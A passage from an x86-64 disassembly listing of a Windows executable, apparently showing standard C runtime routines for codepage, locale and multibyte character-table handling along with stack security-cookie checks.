   140006b11:	e8 4a 29 00 00       	call   0x140009460
   140006b16:	eb 0e                	jmp    0x140006b26
   140006b18:	80 7d 98 00          	cmpb   $0x0,-0x68(%rbp)
   140006b1c:	74 08                	je     0x140006b26
   140006b1e:	49 8b cf             	mov    %r15,%rcx
   140006b21:	e8 4a f6 ff ff       	call   0x140006170
   140006b26:	48 8b cb             	mov    %rbx,%rcx
   140006b29:	ff 15 a1 66 00 00    	call   *0x66a1(%rip)        # 0x14000d1d0
   140006b2f:	80 7d c8 00          	cmpb   $0x0,-0x38(%rbp)
   140006b33:	74 09                	je     0x140006b3e
   140006b35:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   140006b39:	e8 32 f6 ff ff       	call   0x140006170
   140006b3e:	8b c7                	mov    %edi,%eax
   140006b40:	48 8b 8d 20 02 00 00 	mov    0x220(%rbp),%rcx
   140006b47:	48 33 cc             	xor    %rsp,%rcx
   140006b4a:	e8 31 aa ff ff       	call   0x140001580
   140006b4f:	48 8b 9c 24 88 03 00 	mov    0x388(%rsp),%rbx
   140006b56:	00 
   140006b57:	48 81 c4 30 03 00 00 	add    $0x330,%rsp
   140006b5e:	41 5f                	pop    %r15
   140006b60:	41 5e                	pop    %r14
   140006b62:	41 5d                	pop    %r13
   140006b64:	41 5c                	pop    %r12
   140006b66:	5f                   	pop    %rdi
   140006b67:	5e                   	pop    %rsi
   140006b68:	5d                   	pop    %rbp
   140006b69:	c3                   	ret
   140006b6a:	cc                   	int3
   140006b6b:	cc                   	int3
   140006b6c:	e9 57 f9 ff ff       	jmp    0x1400064c8
   140006b71:	cc                   	int3
   140006b72:	cc                   	int3
   140006b73:	cc                   	int3
   140006b74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006b79:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006b7e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006b83:	57                   	push   %rdi
   140006b84:	48 83 ec 40          	sub    $0x40,%rsp
   140006b88:	33 db                	xor    %ebx,%ebx
   140006b8a:	41 8b e8             	mov    %r8d,%ebp
   140006b8d:	48 8b fa             	mov    %rdx,%rdi
   140006b90:	48 8b f1             	mov    %rcx,%rsi
   140006b93:	48 85 c9             	test   %rcx,%rcx
   140006b96:	75 19                	jne    0x140006bb1
   140006b98:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140006b9b:	74 03                	je     0x140006ba0
   140006b9d:	88 5a 28             	mov    %bl,0x28(%rdx)
   140006ba0:	48 89 5a 10          	mov    %rbx,0x10(%rdx)
   140006ba4:	48 89 5a 18          	mov    %rbx,0x18(%rdx)
   140006ba8:	48 89 5a 20          	mov    %rbx,0x20(%rdx)
   140006bac:	e9 bd 00 00 00       	jmp    0x140006c6e
   140006bb1:	66 39 19             	cmp    %bx,(%rcx)
   140006bb4:	75 30                	jne    0x140006be6
   140006bb6:	48 39 5a 18          	cmp    %rbx,0x18(%rdx)
   140006bba:	75 22                	jne    0x140006bde
   140006bbc:	38 5a 28             	cmp    %bl,0x28(%rdx)
   140006bbf:	74 03                	je     0x140006bc4
   140006bc1:	88 5a 28             	mov    %bl,0x28(%rdx)
   140006bc4:	e8 c7 ed ff ff       	call   0x140005990
   140006bc9:	b9 22 00 00 00       	mov    $0x22,%ecx
   140006bce:	89 08                	mov    %ecx,(%rax)
   140006bd0:	88 5f 28             	mov    %bl,0x28(%rdi)
   140006bd3:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   140006bd7:	8b d9                	mov    %ecx,%ebx
   140006bd9:	e9 90 00 00 00       	jmp    0x140006c6e
   140006bde:	48 8b 42 10          	mov    0x10(%rdx),%rax
   140006be2:	88 18                	mov    %bl,(%rax)
   140006be4:	eb c2                	jmp    0x140006ba8
   140006be6:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140006beb:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006bef:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140006bf4:	4c 8b c6             	mov    %rsi,%r8
   140006bf7:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140006bfb:	33 d2                	xor    %edx,%edx
   140006bfd:	8b cd                	mov    %ebp,%ecx
   140006bff:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140006c04:	e8 0f 0d 00 00       	call   0x140007918
   140006c09:	48 63 d0             	movslq %eax,%rdx
   140006c0c:	85 c0                	test   %eax,%eax
   140006c0e:	75 16                	jne    0x140006c26
   140006c10:	ff 15 02 64 00 00    	call   *0x6402(%rip)        # 0x14000d018
   140006c16:	8b c8                	mov    %eax,%ecx
   140006c18:	e8 03 ed ff ff       	call   0x140005920
   140006c1d:	e8 6e ed ff ff       	call   0x140005990
   140006c22:	8b 18                	mov    (%rax),%ebx
   140006c24:	eb 48                	jmp    0x140006c6e
   140006c26:	48 8b 4f 18          	mov    0x18(%rdi),%rcx
   140006c2a:	48 3b d1             	cmp    %rcx,%rdx
   140006c2d:	76 0a                	jbe    0x140006c39
   140006c2f:	38 5f 28             	cmp    %bl,0x28(%rdi)
   140006c32:	74 90                	je     0x140006bc4
   140006c34:	88 5f 28             	mov    %bl,0x28(%rdi)
   140006c37:	eb 8b                	jmp    0x140006bc4
   140006c39:	48 8b 47 10          	mov    0x10(%rdi),%rax
   140006c3d:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006c41:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140006c46:	4c 8b c6             	mov    %rsi,%r8
   140006c49:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140006c4e:	33 d2                	xor    %edx,%edx
   140006c50:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   140006c54:	8b cd                	mov    %ebp,%ecx
   140006c56:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006c5b:	e8 b8 0c 00 00       	call   0x140007918
   140006c60:	48 63 c8             	movslq %eax,%rcx
   140006c63:	85 c0                	test   %eax,%eax
   140006c65:	74 a9                	je     0x140006c10
   140006c67:	48 ff c9             	dec    %rcx
   140006c6a:	48 89 4f 20          	mov    %rcx,0x20(%rdi)
   140006c6e:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140006c73:	8b c3                	mov    %ebx,%eax
   140006c75:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140006c7a:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140006c7f:	48 83 c4 40          	add    $0x40,%rsp
   140006c83:	5f                   	pop    %rdi
   140006c84:	c3                   	ret
   140006c85:	cc                   	int3
   140006c86:	cc                   	int3
   140006c87:	cc                   	int3
   140006c88:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006c8d:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140006c92:	55                   	push   %rbp
   140006c93:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   140006c9a:	ff 
   140006c9b:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   140006ca2:	48 8b 05 57 03 01 00 	mov    0x10357(%rip),%rax        # 0x140017000
   140006ca9:	48 33 c4             	xor    %rsp,%rax
   140006cac:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   140006cb3:	41 8b f8             	mov    %r8d,%edi
   140006cb6:	48 8b da             	mov    %rdx,%rbx
   140006cb9:	41 b8 05 01 00 00    	mov    $0x105,%r8d
   140006cbf:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140006cc4:	ff 15 d6 64 00 00    	call   *0x64d6(%rip)        # 0x14000d1a0
   140006cca:	85 c0                	test   %eax,%eax
   140006ccc:	75 14                	jne    0x140006ce2
   140006cce:	ff 15 44 63 00 00    	call   *0x6344(%rip)        # 0x14000d018
   140006cd4:	8b c8                	mov    %eax,%ecx
   140006cd6:	e8 45 ec ff ff       	call   0x140005920
   140006cdb:	33 c0                	xor    %eax,%eax
   140006cdd:	e9 a0 00 00 00       	jmp    0x140006d82
   140006ce2:	48 83 64 24 60 00    	andq   $0x0,0x60(%rsp)
   140006ce8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006ced:	48 8b c7             	mov    %rdi,%rax
   140006cf0:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   140006cf5:	33 d2                	xor    %edx,%edx
   140006cf7:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140006cfc:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140006d01:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140006d06:	c6 44 24 68 00       	movb   $0x0,0x68(%rsp)
   140006d0b:	e8 30 cd ff ff       	call   0x140003a40
   140006d10:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140006d15:	41 b8 e9 fd 00 00    	mov    $0xfde9,%r8d
   140006d1b:	44 39 40 0c          	cmp    %r8d,0xc(%rax)
   140006d1f:	75 15                	jne    0x140006d36
   140006d21:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140006d26:	74 47                	je     0x140006d6f
   140006d28:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140006d2d:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006d34:	eb 39                	jmp    0x140006d6f
   140006d36:	e8 9d ee ff ff       	call   0x140005bd8
   140006d3b:	85 c0                	test   %eax,%eax
   140006d3d:	75 1a                	jne    0x140006d59
   140006d3f:	38 44 24 38          	cmp    %al,0x38(%rsp)
   140006d43:	74 0c                	je     0x140006d51
   140006d45:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140006d4a:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006d51:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140006d57:	eb 16                	jmp    0x140006d6f
   140006d59:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140006d5e:	74 0c                	je     0x140006d6c
   140006d60:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140006d65:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140006d6c:	45 33 c0             	xor    %r8d,%r8d
   140006d6f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140006d74:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006d79:	e8 f6 fd ff ff       	call   0x140006b74
   140006d7e:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140006d82:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   140006d89:	48 33 cc             	xor    %rsp,%rcx
   140006d8c:	e8 ef a7 ff ff       	call   0x140001580
   140006d91:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   140006d98:	00 
   140006d99:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140006d9d:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140006da1:	49 8b e3             	mov    %r11,%rsp
   140006da4:	5d                   	pop    %rbp
   140006da5:	c3                   	ret
   140006da6:	cc                   	int3
   140006da7:	cc                   	int3
   140006da8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006dad:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140006db2:	57                   	push   %rdi
   140006db3:	48 83 ec 20          	sub    $0x20,%rsp
   140006db7:	49 8b f9             	mov    %r9,%rdi
   140006dba:	49 8b d8             	mov    %r8,%rbx
   140006dbd:	8b 0a                	mov    (%rdx),%ecx
   140006dbf:	e8 64 f2 ff ff       	call   0x140006028
   140006dc4:	90                   	nop
   140006dc5:	48 8b 03             	mov    (%rbx),%rax
   140006dc8:	48 8b 08             	mov    (%rax),%rcx
   140006dcb:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140006dd2:	48 83 c0 18          	add    $0x18,%rax
   140006dd6:	48 8b 0d 9b 19 01 00 	mov    0x1199b(%rip),%rcx        # 0x140018778
   140006ddd:	48 85 c9             	test   %rcx,%rcx
   140006de0:	74 6f                	je     0x140006e51
   140006de2:	48 85 c0             	test   %rax,%rax
   140006de5:	74 5d                	je     0x140006e44
   140006de7:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140006ded:	45 8b c8             	mov    %r8d,%r9d
   140006df0:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140006df4:	0f 10 00             	movups (%rax),%xmm0
   140006df7:	0f 11 01             	movups %xmm0,(%rcx)
   140006dfa:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140006dfe:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140006e02:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140006e06:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140006e0a:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140006e0e:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140006e12:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140006e16:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140006e1a:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140006e1e:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140006e22:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140006e26:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140006e2a:	48 03 ca             	add    %rdx,%rcx
   140006e2d:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140006e31:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140006e35:	48 03 c2             	add    %rdx,%rax
   140006e38:	49 83 e9 01          	sub    $0x1,%r9
   140006e3c:	75 b6                	jne    0x140006df4
   140006e3e:	8a 00                	mov    (%rax),%al
   140006e40:	88 01                	mov    %al,(%rcx)
   140006e42:	eb 27                	jmp    0x140006e6b
   140006e44:	33 d2                	xor    %edx,%edx
   140006e46:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   140006e4c:	e8 cf ba ff ff       	call   0x140002920
   140006e51:	e8 3a eb ff ff       	call   0x140005990
   140006e56:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006e5c:	e8 0f ea ff ff       	call   0x140005870
   140006e61:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140006e67:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   140006e6b:	48 8b 03             	mov    (%rbx),%rax
   140006e6e:	48 8b 08             	mov    (%rax),%rcx
   140006e71:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140006e78:	48 05 19 01 00 00    	add    $0x119,%rax
   140006e7e:	48 8b 0d fb 18 01 00 	mov    0x118fb(%rip),%rcx        # 0x140018780
   140006e85:	48 85 c9             	test   %rcx,%rcx
   140006e88:	74 5e                	je     0x140006ee8
   140006e8a:	48 85 c0             	test   %rax,%rax
   140006e8d:	74 4c                	je     0x140006edb
   140006e8f:	0f 10 00             	movups (%rax),%xmm0
   140006e92:	0f 11 01             	movups %xmm0,(%rcx)
   140006e95:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140006e99:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   140006e9d:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   140006ea1:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   140006ea5:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   140006ea9:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   140006ead:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   140006eb1:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   140006eb5:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   140006eb9:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   140006ebd:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   140006ec1:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   140006ec5:	48 03 ca             	add    %rdx,%rcx
   140006ec8:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   140006ecc:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   140006ed0:	48 03 c2             	add    %rdx,%rax
   140006ed3:	49 83 e8 01          	sub    $0x1,%r8
   140006ed7:	75 b6                	jne    0x140006e8f
   140006ed9:	eb 1d                	jmp    0x140006ef8
   140006edb:	33 d2                	xor    %edx,%edx
   140006edd:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140006ee3:	e8 38 ba ff ff       	call   0x140002920
   140006ee8:	e8 a3 ea ff ff       	call   0x140005990
   140006eed:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006ef3:	e8 78 e9 ff ff       	call   0x140005870
   140006ef8:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006efc:	48 8b 08             	mov    (%rax),%rcx
   140006eff:	48 8b 11             	mov    (%rcx),%rdx
   140006f02:	83 c8 ff             	or     $0xffffffff,%eax
   140006f05:	f0 0f c1 02          	lock xadd %eax,(%rdx)
   140006f09:	83 f8 01             	cmp    $0x1,%eax
   140006f0c:	75 1b                	jne    0x140006f29
   140006f0e:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006f12:	48 8b 08             	mov    (%rax),%rcx
   140006f15:	48 8d 05 b4 02 01 00 	lea    0x102b4(%rip),%rax        # 0x1400171d0
   140006f1c:	48 39 01             	cmp    %rax,(%rcx)
   140006f1f:	74 08                	je     0x140006f29
   140006f21:	48 8b 09             	mov    (%rcx),%rcx
   140006f24:	e8 47 f2 ff ff       	call   0x140006170
   140006f29:	48 8b 03             	mov    (%rbx),%rax
   140006f2c:	48 8b 10             	mov    (%rax),%rdx
   140006f2f:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140006f33:	48 8b 08             	mov    (%rax),%rcx
   140006f36:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   140006f3d:	48 89 01             	mov    %rax,(%rcx)
   140006f40:	48 8b 03             	mov    (%rbx),%rax
   140006f43:	48 8b 08             	mov    (%rax),%rcx
   140006f46:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140006f4d:	f0 ff 00             	lock incl (%rax)
   140006f50:	8b 0f                	mov    (%rdi),%ecx
   140006f52:	e8 25 f1 ff ff       	call   0x14000607c
   140006f57:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006f5c:	48 83 c4 20          	add    $0x20,%rsp
   140006f60:	5f                   	pop    %rdi
   140006f61:	c3                   	ret
   140006f62:	cc                   	int3
   140006f63:	cc                   	int3
   140006f64:	40 53                	rex push %rbx
   140006f66:	48 83 ec 40          	sub    $0x40,%rsp
   140006f6a:	8b d9                	mov    %ecx,%ebx
   140006f6c:	33 d2                	xor    %edx,%edx
   140006f6e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006f73:	e8 c8 ca ff ff       	call   0x140003a40
   140006f78:	83 25 11 18 01 00 00 	andl   $0x0,0x11811(%rip)        # 0x140018790
   140006f7f:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140006f82:	75 12                	jne    0x140006f96
   140006f84:	c7 05 02 18 01 00 01 	movl   $0x1,0x11802(%rip)        # 0x140018790
   140006f8b:	00 00 00 
   140006f8e:	ff 15 64 62 00 00    	call   *0x6264(%rip)        # 0x14000d1f8
   140006f94:	eb 15                	jmp    0x140006fab
   140006f96:	83 fb fd             	cmp    $0xfffffffd,%ebx
   140006f99:	75 14                	jne    0x140006faf
   140006f9b:	c7 05 eb 17 01 00 01 	movl   $0x1,0x117eb(%rip)        # 0x140018790
   140006fa2:	00 00 00 
   140006fa5:	ff 15 45 62 00 00    	call   *0x6245(%rip)        # 0x14000d1f0
   140006fab:	8b d8                	mov    %eax,%ebx
   140006fad:	eb 17                	jmp    0x140006fc6
   140006faf:	83 fb fc             	cmp    $0xfffffffc,%ebx
   140006fb2:	75 12                	jne    0x140006fc6
   140006fb4:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   140006fb9:	c7 05 cd 17 01 00 01 	movl   $0x1,0x117cd(%rip)        # 0x140018790
   140006fc0:	00 00 00 
   140006fc3:	8b 58 0c             	mov    0xc(%rax),%ebx
   140006fc6:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   140006fcb:	74 0c                	je     0x140006fd9
   140006fcd:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140006fd2:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   140006fd9:	8b c3                	mov    %ebx,%eax
   140006fdb:	48 83 c4 40          	add    $0x40,%rsp
   140006fdf:	5b                   	pop    %rbx
   140006fe0:	c3                   	ret
   140006fe1:	cc                   	int3
   140006fe2:	cc                   	int3
   140006fe3:	cc                   	int3
   140006fe4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006fe9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140006fee:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006ff3:	57                   	push   %rdi
   140006ff4:	48 83 ec 20          	sub    $0x20,%rsp
   140006ff8:	48 8d 59 18          	lea    0x18(%rcx),%rbx
   140006ffc:	48 8b f1             	mov    %rcx,%rsi
   140006fff:	bd 01 01 00 00       	mov    $0x101,%ebp
   140007004:	48 8b cb             	mov    %rbx,%rcx
   140007007:	44 8b c5             	mov    %ebp,%r8d
   14000700a:	33 d2                	xor    %edx,%edx
   14000700c:	e8 0f b9 ff ff       	call   0x140002920
   140007011:	33 c0                	xor    %eax,%eax
   140007013:	48 8d 7e 0c          	lea    0xc(%rsi),%rdi
   140007017:	48 89 46 04          	mov    %rax,0x4(%rsi)
   14000701b:	b9 06 00 00 00       	mov    $0x6,%ecx
   140007020:	48 89 86 20 02 00 00 	mov    %rax,0x220(%rsi)
   140007027:	0f b7 c0             	movzwl %ax,%eax
   14000702a:	66 f3 ab             	rep stos %ax,(%rdi)
   14000702d:	48 8d 3d 9c 01 01 00 	lea    0x1019c(%rip),%rdi        # 0x1400171d0
   140007034:	48 2b fe             	sub    %rsi,%rdi
   140007037:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   14000703a:	88 03                	mov    %al,(%rbx)
   14000703c:	48 ff c3             	inc    %rbx
   14000703f:	48 83 ed 01          	sub    $0x1,%rbp
   140007043:	75 f2                	jne    0x140007037
   140007045:	48 8d 8e 19 01 00 00 	lea    0x119(%rsi),%rcx
   14000704c:	ba 00 01 00 00       	mov    $0x100,%edx
   140007051:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   140007054:	88 01                	mov    %al,(%rcx)
   140007056:	48 ff c1             	inc    %rcx
   140007059:	48 83 ea 01          	sub    $0x1,%rdx
   14000705d:	75 f2                	jne    0x140007051
   14000705f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007064:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007069:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000706e:	48 83 c4 20          	add    $0x20,%rsp
   140007072:	5f                   	pop    %rdi
   140007073:	c3                   	ret
   140007074:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007079:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000707e:	55                   	push   %rbp
   14000707f:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   140007086:	ff 
   140007087:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   14000708e:	48 8b 05 6b ff 00 00 	mov    0xff6b(%rip),%rax        # 0x140017000
   140007095:	48 33 c4             	xor    %rsp,%rax
   140007098:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   14000709f:	48 8b d9             	mov    %rcx,%rbx
   1400070a2:	8b 49 04             	mov    0x4(%rcx),%ecx
   1400070a5:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   1400070ab:	0f 84 3d 01 00 00    	je     0x1400071ee
   1400070b1:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400070b6:	ff 15 44 61 00 00    	call   *0x6144(%rip)        # 0x14000d200
   1400070bc:	85 c0                	test   %eax,%eax
   1400070be:	0f 84 2a 01 00 00    	je     0x1400071ee
   1400070c4:	33 c0                	xor    %eax,%eax
   1400070c6:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400070cb:	be 00 01 00 00       	mov    $0x100,%esi
   1400070d0:	88 01                	mov    %al,(%rcx)
   1400070d2:	ff c0                	inc    %eax
   1400070d4:	48 ff c1             	inc    %rcx
   1400070d7:	3b c6                	cmp    %esi,%eax
   1400070d9:	72 f5                	jb     0x1400070d0
   1400070db:	8a 44 24 56          	mov    0x56(%rsp),%al
   1400070df:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   1400070e4:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   1400070e9:	eb 20                	jmp    0x14000710b
   1400070eb:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   1400070f0:	0f b6 c8             	movzbl %al,%ecx
   1400070f3:	eb 0b                	jmp    0x140007100
   1400070f5:	3b ce                	cmp    %esi,%ecx
   1400070f7:	73 0c                	jae    0x140007105
   1400070f9:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   1400070fe:	ff c1                	inc    %ecx
   140007100:	41 3b c8             	cmp    %r8d,%ecx
   140007103:	76 f0                	jbe    0x1400070f5
   140007105:	48 83 c2 02          	add    $0x2,%rdx
   140007109:	8a 02                	mov    (%rdx),%al
   14000710b:	84 c0                	test   %al,%al
   14000710d:	75 dc                	jne    0x1400070eb
   14000710f:	8b 43 04             	mov    0x4(%rbx),%eax
   140007112:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140007117:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   14000711c:	44 8b ce             	mov    %esi,%r9d
   14000711f:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140007123:	ba 01 00 00 00       	mov    $0x1,%edx
   140007128:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   14000712f:	33 c9                	xor    %ecx,%ecx
   140007131:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007136:	e8 5d 12 00 00       	call   0x140008398
   14000713b:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140007140:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140007145:	8b 43 04             	mov    0x4(%rbx),%eax
   140007148:	44 8b c6             	mov    %esi,%r8d
   14000714b:	48 8b 93 20 02 00 00 	mov    0x220(%rbx),%rdx
   140007152:	33 c9                	xor    %ecx,%ecx
   140007154:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140007158:	48 8d 45 70          	lea    0x70(%rbp),%rax
   14000715c:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140007160:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140007165:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140007169:	e8 8e 2f 00 00       	call   0x14000a0fc
   14000716e:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   140007173:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   140007178:	8b 43 04             	mov    0x4(%rbx),%eax
   14000717b:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140007181:	48 8b 93 20 02 00 00 	mov    0x220(%rbx),%rdx
   140007188:	33 c9                	xor    %ecx,%ecx
   14000718a:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000718e:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   140007195:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140007199:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000719e:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400071a2:	e8 55 2f 00 00       	call   0x14000a0fc
   1400071a7:	b8 01 00 00 00       	mov    $0x1,%eax
   1400071ac:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   1400071b3:	f6 02 01             	testb  $0x1,(%rdx)
   1400071b6:	74 0b                	je     0x1400071c3
   1400071b8:	80 4c 18 18 10       	orb    $0x10,0x18(%rax,%rbx,1)
   1400071bd:	8a 4c 05 6f          	mov    0x6f(%rbp,%rax,1),%cl
   1400071c1:	eb 15                	jmp    0x1400071d8
   1400071c3:	f6 02 02             	testb  $0x2,(%rdx)
   1400071c6:	74 0e                	je     0x1400071d6
   1400071c8:	80 4c 18 18 20       	orb    $0x20,0x18(%rax,%rbx,1)
   1400071cd:	8a 8c 05 6f 01 00 00 	mov    0x16f(%rbp,%rax,1),%cl
   1400071d4:	eb 02                	jmp    0x1400071d8
   1400071d6:	32 c9                	xor    %cl,%cl
   1400071d8:	88 8c 18 18 01 00 00 	mov    %cl,0x118(%rax,%rbx,1)
   1400071df:	48 83 c2 02          	add    $0x2,%rdx
   1400071e3:	48 ff c0             	inc    %rax
   1400071e6:	48 83 ee 01          	sub    $0x1,%rsi
   1400071ea:	75 c7                	jne    0x1400071b3
   1400071ec:	eb 43                	jmp    0x140007231
   1400071ee:	33 d2                	xor    %edx,%edx
   1400071f0:	be 00 01 00 00       	mov    $0x100,%esi
   1400071f5:	8d 4a 01             	lea    0x1(%rdx),%ecx
   1400071f8:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   1400071fc:	41 8d 40 20          	lea    0x20(%r8),%eax
   140007200:	83 f8 19             	cmp    $0x19,%eax
   140007203:	77 0a                	ja     0x14000720f
   140007205:	80 4c 0b 18 10       	orb    $0x10,0x18(%rbx,%rcx,1)
   14000720a:	8d 42 20             	lea    0x20(%rdx),%eax
   14000720d:	eb 12                	jmp    0x140007221
   14000720f:	41 83 f8 19          	cmp    $0x19,%r8d
   140007213:	77 0a                	ja     0x14000721f
   140007215:	80 4c 0b 18 20       	orb    $0x20,0x18(%rbx,%rcx,1)
   14000721a:	8d 42 e0             	lea    -0x20(%rdx),%eax
   14000721d:	eb 02                	jmp    0x140007221
   14000721f:	32 c0                	xor    %al,%al
